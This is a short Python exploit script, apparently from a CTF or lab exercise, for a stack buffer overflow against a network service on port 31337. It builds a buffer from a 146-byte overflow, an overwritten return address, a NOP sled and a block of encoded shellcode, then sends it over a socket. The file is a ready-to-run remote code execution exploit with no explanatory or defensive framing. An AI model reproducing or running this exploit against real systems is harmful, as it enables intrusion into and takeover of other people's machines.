import socket

ip = "172.20.192.1"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90"*100


payload = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xa5\xa8\xab\x86\x83\xee\xfc\xe2\xf4\x59\x40\x29\x86"
"\xa5\xa8\xcb\x0f\x40\x99\x6b\xe2\x2e\xf8\x9b\x0d\xf7\xa4"
"\x20\xd4\xb1\x23\xd9\xae\xaa\x1f\xe1\xa0\x94\x57\x07\xba"
"\xc4\xd4\xa9\xaa\x85\x69\x64\x8b\xa4\x6f\x49\x74\xf7\xff"
"\x20\xd4\xb5\x23\xe1\xba\x2e\xe4\xba\xfe\x46\xe0\xaa\x57"
"\xf4\x23\xf2\xa6\xa4\x7b\x20\xcf\xbd\x4b\x91\xcf\x2e\x9c"
"\x20\x87\x73\x99\x54\x2a\x64\x67\xa6\x87\x62\x90\x4b\xf3"
"\x53\xab\xd6\x7e\x9e\xd5\x8f\xf3\x41\xf0\x20\xde\x81\xa9"
"\x78\xe0\x2e\xa4\xe0\x0d\xfd\xb4\xaa\x55\x2e\xac\x20\x87"
"\x75\x21\xef\xa2\x81\xf3\xf0\xe7\xfc\xf2\xfa\x79\x45\xf7"
"\xf4\xdc\x2e\xba\x40\x0b\xf8\xc0\x98\xb4\xa5\xa8\xc3\xf1"
"\xd6\x9a\xf4\xd2\xcd\xe4\xdc\xa0\xa2\x57\x7e\x3e\x35\xa9"
"\xab\x86\x8c\x6c\xff\xd6\xcd\x81\x2b\xed\xa5\x57\x7e\xd6"
"\xf5\xf8\xfb\xc6\xf5\xe8\xfb\xee\x4f\xa7\x74\x66\x5a\x7d"
"\x3c\xec\xa0\xc0\x07\x92\x63\xc6\xc3\x84\xa5\xb9\xf7\x0f"
"\x43\xc2\xbb\xd0\xf2\xc0\x32\x23\xd1\xc9\x54\x53\x20\x68"
"\xdf\x8a\x5a\xe6\xa3\xf3\x49\xc0\x5b\x33\x07\xfe\x54\x53"
"\xcd\xcb\xc6\xe2\xa5\x21\x48\xd1\xf2\xff\x9a\x70\xcf\xba"
"\xf2\xd0\x47\x55\xcd\x41\xe1\x8c\x97\x87\xa4\x25\xef\xa2"
"\xb5\x6e\xab\xc2\xf1\xf8\xfd\xd0\xf3\xee\xfd\xc8\xf3\xfe"
"\xf8\xd0\xcd\xd1\x67\xb9\x23\x57\x7e\x0f\x45\xe6\xfd\xc0"
"\x5a\x98\xc3\x8e\x22\xb5\xcb\x79\x70\x13\x4b\x9b\x8f\xa2"
"\xc3\x20\x30\x15\x36\x79\x70\x94\xad\xfa\xaf\x28\x50\x66"
"\xd0\xad\x10\xc1\xb6\xda\xc4\xec\xa5\xfb\x54\x53")
buffer = overflow + retn + padding + payload + "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
